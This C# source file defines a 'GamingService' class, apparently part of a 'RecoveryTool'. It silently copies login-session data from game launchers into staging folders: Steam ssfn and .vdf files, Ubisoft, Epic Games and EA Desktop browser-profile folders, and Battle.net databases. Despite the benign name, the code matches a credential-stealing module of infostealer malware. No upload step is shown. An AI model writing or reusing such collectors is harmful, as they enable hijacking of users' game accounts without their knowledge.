using RecoveryTool.Recovery.Utilities;
using Microsoft.Win32;

namespace RecoveryTool.Recovery.Gaming
{
    public class GamingService : BaseService
    {
        public static async Task SaveUbisoftAsync()
        {
            string sourceDir = Path.Combine(Common.LocalData, "Ubisoft Game Launcher");
            if (Directory.Exists(sourceDir))
            {
                string destDir = Common.EnsureUbisoftPath();
                await CopyDirectoryAsync(sourceDir, destDir);
            }
        }

        public static async Task SaveSteamAsync()
        {
            var steamPath = (string)Registry.GetValue(@"HKEY_CURRENT_USER\Software\Valve\Steam", "SteamPath", null);
            if (string.IsNullOrEmpty(steamPath) || !DirectoryExists(steamPath))
            {
                return;
            }

            var ensureSteamPath = Common.EnsureSteamPath();
            var searchPatterns = new List<string>
            {
                "*ssfn*",
                "*.vdf"
            };

            await CopyFilesWithPatternsAsync(steamPath, ensureSteamPath, searchPatterns);
        }

        private static readonly string[] SubFolders = ["Config", "Logs", "Data"];

        public static async Task SaveEpicGamesAsync()
        {
            string epicGamesFolder = Path.Combine(Common.LocalData, "EpicGamesLauncher", "Saved");
            if (!DirectoryExists(epicGamesFolder)) return;

            string basePath = Common.EnsureEpicGamesPath();

            var copyTasks = SubFolders
                .Select(folder => (Source: Path.Combine(epicGamesFolder, folder), Dest: Path.Combine(basePath, folder)))
                .Where(paths => DirectoryExists(paths.Source))
                .Select(paths => CopyDirectoryAsync(paths.Source, paths.Dest));

            await Task.WhenAll(copyTasks);
        }

        public static async Task SaveEaAsync()
        {
            string sourceDir = Path.Combine(Common.LocalData, "Electronic Arts", "EA Desktop", "CEF");
            if (!DirectoryExists(sourceDir)) return;

            string destDir = Common.EnsureEaPath();
            await CopyDirectoryAsync(sourceDir, destDir);
        }

        public static async Task SaveBattleNetAsync()
        {
            try
            {
                string battleFolder = Path.Combine(Common.AppData, "Battle.net");
                if (!DirectoryExists(battleFolder)) return;

                string battleSession = Common.EnsureBattleNetPath();

                string[] extensions = ["*.db", "*.config"];
                await CopyFilesWithPatternsAsync(battleFolder, battleSession, extensions);
            } catch { }
        }
    }
}
